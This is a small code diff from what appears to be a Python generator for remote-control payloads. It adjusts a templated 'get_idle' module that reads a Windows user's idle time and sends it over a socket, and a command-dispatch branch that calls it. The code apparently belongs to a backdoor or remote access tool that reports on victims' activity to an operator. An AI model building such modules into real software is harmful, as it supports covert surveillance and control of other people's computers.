@@ -19,8 +19,7 @@ def get_idle(data):
     lastInputInfo.cbSize = sizeof(lastInputInfo)
     windll.user32.GetLastInputInfo(byref(lastInputInfo))
     millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
-    s.sendall('[+]User has been active for : ' + str(millis / 1000.0))
-    ''')
+    s.sendall('[+]User has been active for : ' + str(millis / 1000.0))''')
         config.logics.append('''
             elif command == "get_idle":
                 get_idle(data)''')
